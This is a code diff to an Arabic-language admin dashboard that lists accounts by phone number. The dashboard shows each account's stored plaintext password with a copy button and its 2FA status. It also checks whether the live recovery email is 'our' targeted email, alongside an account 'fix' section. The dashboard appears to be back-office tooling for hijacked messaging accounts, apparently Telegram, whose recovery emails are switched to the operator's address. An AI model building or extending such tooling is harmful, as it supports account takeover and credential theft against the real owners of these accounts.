@@ -419,6 +419,13 @@
                 const result = await apiCall(`/admin/account/${encodeURIComponent(phone)}`);
                 const acc = result.account;
                 
+                const emailStatusText = {
+                    'confirmed': '✅ مؤكد',
+                    'pending_confirmation': '⏳ بانتظار التأكيد',
+                    'set_but_hidden': '🔒 مخفي',
+                    'none': '❌ غير موجود'
+                };
+                
                 document.getElementById('modal-body').innerHTML = `
                     <div class="detail-row">
                         <span class="label">الهاتف:</span>
@@ -436,18 +443,21 @@
                         <span class="label">كلمة المرور:</span>
                         <span class="value">${acc.password || '-'} ${acc.password ? `<button class="copy-btn" onclick="copyText('${acc.password}')">📋</button>` : ''}</span>
                     </div>
+                    <hr style="margin: 10px 0; border-color: #0088cc;">
+                    <h4 style="color: #0088cc; margin: 10px 0;">📧 Recovery Email (Live):</h4>
+                    <div class="detail-row" style="background: ${acc.is_our_email ? '#d4edda' : '#fff3cd'};">
+                        <span class="label">الإيميل الحالي:</span>
+                        <span class="value">${acc.current_recovery_email || 'غير موجود'} ${acc.is_our_email ? '✅' : '⚠️'}</span>
+                    </div>
                     <div class="detail-row">
-                        <span class="label">الإيميل المستهدف:</span>
+                        <span class="label">حالة الإيميل:</span>
+                        <span class="value">${emailStatusText[acc.email_status] || acc.email_status || '-'}</span>
+                    </div>
+                    <div class="detail-row">
+                        <span class="label">إيميلنا المستهدف:</span>
                         <span class="value">${acc.target_email || '-'}</span>
                     </div>
-                    <div class="detail-row">
-                        <span class="label">Hash:</span>
-                        <span class="value">${acc.email_hash || '-'}</span>
-                    </div>
-                    <div class="detail-row">
-                        <span class="label">الإيميل متغير:</span>
-                        <span class="value">${acc.email_changed ? '✅ نعم' : '❌ لا'}</span>
-                    </div>
+                    <hr style="margin: 10px 0;">
                     <div class="detail-row">
                         <span class="label">2FA:</span>
                         <span class="value">${acc.has_2fa ? '✅ مفعل' : '❌ غير مفعل'}</span>
@@ -471,10 +481,6 @@
                     <div class="detail-row">
                         <span class="label">تاريخ الإنشاء:</span>
                         <span class="value">${acc.created_at ? new Date(acc.created_at).toLocaleString('ar-EG') : '-'}</span>
-                    </div>
-                    <div class="detail-row">
-                        <span class="label">تاريخ الإكمال:</span>
-                        <span class="value">${acc.completed_at ? new Date(acc.completed_at).toLocaleString('ar-EG') : '-'}</span>
                     </div>
                     <hr style="margin: 15px 0;">
                     <h4 style="margin-bottom: 10px;">🔧 إصلاح الحساب:</h4>
